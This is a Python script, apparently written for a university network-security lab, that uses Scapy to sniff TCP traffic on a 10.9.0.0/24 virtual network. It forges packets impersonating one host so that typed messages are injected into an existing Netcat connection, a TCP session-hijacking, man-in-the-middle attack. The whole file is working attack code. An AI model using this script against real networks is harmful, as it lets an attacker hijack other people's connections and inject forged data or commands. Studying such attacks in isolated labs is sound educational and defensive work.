""" 
    - In this file, I try to use 3 VMachines, which are Host A, B and Attacker that lab mentioned above.
    - The A and B will communicate through TCP connection using Netcat tool.
    - I write a simple Python script using Scapy to make a MITM attack.
    - Attacker will impersonate as host A to communicate with host B while host A still connects to B.
"""

from scapy.all import *
import sys as s

def swap(a,b):
    temp = a
    a = b
    b = temp
    return a,b

def spoof_tcp_sniffed_packet(pkt):
    # Get the TCP packet that responses message sent and after TCP Handshake only
    # SYN = 0x2
    # PSH = 0x8
    # ACK = 0x10
    if TCP in pkt and pkt[TCP].flags==0x10:
        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst
        port_src = pkt[TCP].sport            # Must be Client's port
        port_dest = pkt[TCP].dport           # Must be Server's port listening

        flag_ip = pkt[IP].flags
        flag_tcp = pkt[TCP].flags
        seq_num = pkt[TCP].seq
        ack_num = pkt[TCP].ack
        window_sz = pkt[TCP].window

        print(f"\033[0;32;40m \nORIGINAL PACKET")
        print(f"Source IP Addr: {ip_src}")
        print(f"Destination IP Addr: {ip_dst}")
        print(f"Source Port: {port_src}")
        print(f"Destination Port: {port_dest}")

        print(f"Flags: {flag_tcp}")
        print(f"Sequence number is: {seq_num}")
        print(f"ACK num is: {ack_num}")

        # Spoof data of TCP packet
        new_data = input("Please input message: ") + '\n'
        
        # Swap IP, Port Source and Destination if capturing pakcet about Server sends to Client
        if(ip_src=='10.9.0.6' and port_dest!=4444):
            ip_src, ip_dst = swap(ip_src, ip_dst)
            port_src, port_dest = swap(port_src, port_dest)
            seq_num, ack_num = swap(seq_num, ack_num)

        spoofed_pkt = IP(src=ip_src, dst=ip_dst, flags=flag_ip)/TCP(sport=port_src,
                                                      dport=port_dest, 
                                                      seq=seq_num, 
                                                      ack=ack_num,
                                                      window=window_sz,
                                                      flags=0x18)/new_data

        print(f"\033[0;31;40m \nSPOOFED PACKET")
        print(f"Source IP Addr: {spoofed_pkt[IP].src}")
        print(f"Destination IP Addr: {spoofed_pkt[IP].dst}")
        print(f"Source Port: {spoofed_pkt[TCP].sport}")
        print(f"Destination Port: {spoofed_pkt[TCP].dport}")

        print(f"Message is: {new_data}")
        print(f"Sequence number is: {spoofed_pkt[TCP].seq}")
        print(f"ACK num is: {spoofed_pkt[TCP].ack}")
        print(f"TCP Flags: {spoofed_pkt[TCP].flags}")

        send(spoofed_pkt, verbose=0)

        #os.system('clear')
        time.sleep(10)

# host_ip = s.argv[1]
filter_str = 'tcp and net 10.9.0.0/24'
interfaces = ['br-d6b258aef2ee', 'ens32']

time.sleep(10)
pkt = sniff(iface=interfaces, filter=filter_str, prn=spoof_tcp_sniffed_packet)